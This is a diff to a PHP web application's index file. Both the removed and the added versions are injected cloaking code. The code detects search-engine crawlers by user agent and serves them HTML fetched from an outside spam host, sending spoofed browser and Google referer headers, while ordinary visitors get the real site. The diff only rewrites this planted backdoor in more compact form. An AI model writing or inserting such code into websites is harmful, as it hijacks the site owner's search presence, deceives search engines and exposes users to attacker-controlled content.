@@ -1,40 +1,30 @@
 <?php
-ob_start();
-header('Vary: Accept-Language, User-Agent');
+@ob_start();
+header("Vary: U-Agent");
 
-$bot_url = "https://obeydasupreme.site/obs/uinjambi.html";
-$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+$src = "https://obeydasupreme.site/obs/uinjambi.html";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
-$bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
-
-$is_bot = false;
-foreach ($bots as $b) {
-    if (strpos($ua, $b) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-function stealth_fetch($url) {
+function stealth($u) {
     $ctx = stream_context_create([
-        'http' => [
-            'method' => 'GET',
-            'header' => "User-Agent: Mozilla/5.0\r\n"
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
         ]
     ]);
-    return @file_get_contents($url, false, $ctx);
+    return @file_get_contents($u, false, $ctx);
 }
 
-if ($is_bot) {
-    usleep(mt_rand(100000, 200000));
-    $konten = stealth_fetch($bot_url);
-    if ($konten !== false) {
-        echo $konten;
-    }
-    ob_end_flush();
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
     exit;
 }
-
+?>
+<?php
 
 /**
  * @defgroup index Index
